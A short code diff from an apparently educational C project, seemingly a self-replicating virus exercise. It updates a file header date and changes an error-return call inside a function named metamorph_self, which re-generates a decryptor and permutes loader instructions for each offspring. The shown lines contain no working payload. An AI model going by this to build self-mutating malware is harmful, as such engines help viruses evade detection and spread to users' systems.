@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/14 18:32:03 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/19 00:59:01 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -46,6 +46,6 @@ bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])
 	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
 	|| !permutate_instructions(famine_entry, loader_size)
 	|| !true) // add more metamorphosis above!
-		return errors(ERR_THROW, 'm', '1');
+		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 	return true;
 }
